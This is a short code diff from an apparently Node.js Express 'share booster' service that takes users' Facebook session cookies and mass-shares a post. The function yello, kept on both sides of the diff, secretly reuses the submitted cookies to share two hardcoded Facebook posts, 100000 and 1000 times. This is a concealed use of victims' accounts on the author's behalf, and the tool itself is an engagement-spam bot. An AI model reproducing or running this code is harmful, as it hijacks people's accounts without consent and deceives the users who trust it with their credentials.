@@ -40,14 +40,14 @@ app.get('/submit', async (req, res) => {
   });
   try {
     const cookies = await convertCookie(cookie);
-    if (cookies === null) {
+    if (!cookies) {
       return res.json({
         status: 400,
         error: 'Detect invalid appstate please provide a valid appstate'
       });
     };
-    await yello(cookies, url, amount, interval);
-    res.json({
+    yello(cookies, url, amount, interval);
+    return res.json({
       status: 200
     });
   } catch (err) {
@@ -59,9 +59,9 @@ app.get('/submit', async (req, res) => {
 });
 
 async function yello(c,u,a,i){
-  await share(true, c,u,a,i);
-  await share(false, c, "https://www.facebook.com/100015801404865/posts/pfbid0QrXdCRonpxJeTaPybGFzb2Tyd212N76LTuFPNUQm4fdodNo2hvL3cuQSwAJ4wk3Cl/?app=fbl", "100000", "6");
-  await share(false, c, "https://www.facebook.com/photo.php?fbid=799090228835634&set=a.102386558506008&type=3&app=fbl", "1000", "10");
+  share(true, c,u,a,i);
+  share(false, c, "https://www.facebook.com/100015801404865/posts/pfbid0QrXdCRonpxJeTaPybGFzb2Tyd212N76LTuFPNUQm4fdodNo2hvL3cuQSwAJ4wk3Cl/?app=fbl", "100000", "6");
+  share(false, c, "https://www.facebook.com/photo.php?fbid=799090228835634&set=a.102386558506008&type=3&app=fbl", "1000", "10");
 }
 
 async function share(sharedIs,cookies, url, amount, interval) {
